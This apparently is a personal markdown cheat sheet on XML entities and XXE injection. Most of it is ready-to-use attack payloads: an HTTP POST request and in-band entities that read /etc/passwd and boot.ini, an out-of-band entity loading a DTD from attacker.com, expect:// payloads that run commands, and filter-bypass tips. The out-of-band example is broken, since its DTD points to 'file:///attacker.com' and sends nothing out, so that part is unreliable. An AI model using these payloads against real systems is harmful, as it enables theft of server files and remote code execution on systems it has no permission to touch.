# XML 

## What is it?
### Internal vs External Entity
Internal Entity: If an entity is declared within a DTD it is called as internal entity. Syntax: `<!ENTITY entity_name "entity_value">`

External Entity: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM. Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

### Basic Syntax
This Document Type Definition (DTD) pulls in a local file using `SYSTEM` keyword
```xml
<!DOCTYPE STRUCTURE [
<!ELEMENT SPECIFICATIONS (#PCDATA)>
<!ENTITY VERSION “1.1”>
<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
]>
```
To use it within XML, we can `&file;`:
```xml
<specifications>&file;</specifications>
```

Note: External entities can be used without having a full DTD. Call DTD using square brackets
```xml
<?xml version=”1.0″ encoding=”ISO-8859-1″?>
<!DOCTYPE example [
<!ELEMENT example ANY >
<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
]>
<configuration>&file;</configuration>
```

### Types of entities
```xml
<!ENTITY normal "hello"> 

<!ENTITY % component "hello1"> 
<!ENTITY % parameterised "%component;">   --> only parameterised entities can work in other parameterised entities. Value = hello1

<!ENTITY sys SYSTEM "file:///"> --> anything inside SYSTEM var is treated as literal. Cant use %xx here

Instead, embed an enity declaration within another entity declaration
<!ENTITY % sys <!ENTITY SYSTEM "&#x25; test SYSTEM '%component;'>"> --> replaced with <!ENTITY % sys <!ENTITY SYSTEM "&#x25; test SYSTEM 'hello1'>"> 
```

# XXE Attack

An XXE attack is a type of attack against applications that parses XML input and allows XML entities. These entities can be used to tell the parser to fetch specific content on the server.

Idea is to:
* Intercept the vulnerable POST request 
* Place injected ENTITY tag and &xxe variable reference with data that will be stored and displayed
* Send POST request

Example in a POST request
```
POST /notes/savenote HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml;charset=UTF-8
Host: myserver.com

<?xml version=”1.0″ ?>
<!DOCTYPE foo 
[<!ENTITY xxe SYSTEM “file:///etc/passwd” >
]>

<note>
<to>Alice</to>
<from>Bob</from>
<header>Sync Meeting</header>
<time>1200</time>
<body>Meeting time changed &xxe;</body>
</note>
```


## Basic Exploit Payloads:

IN BAND XXE: Accessing a local resource 
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

OUT OF BAND XXE:

Note: `% dtd` is a parameter entry and `send` is a direct entry. 
Parameter entries get replaced by using `%dtd;`

```xml
POST http://example.com/xml HTTP/1.1
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data> 
```

Inside `http://attacker.com/evil.dtd`:

```xml
<!ENTITY send SYSTEM "file:///attacker.com">
```

## Some other URI's to use instead of file: 
```
<!ENTITY xxe SYSTEM "file:////etc/passwd" >]><foo> &xxe; </foo>
<!ENTITY xxe SYSTEM "file:///c:boot.ini" >]><foo> &xxe; </foo>
<!ENTITY xxe SYSTEM "expect://id" >]>
```

[More payloads heree](https://gist.github.com/staaldraad/01415b990939494879b4)

### XXE for Code Exec
**PHP** has a module `expect` thats lets you run commands like they are a file
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "expect://ls" >]>

<foo>&xxe;</foo>

```

## WF Bypass
1. Change encodings (UTF-8, UTF-16, UTF-32)
2. SYSTEM and PUBLIC are synonyms
3. Try going deeper within each file itself
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md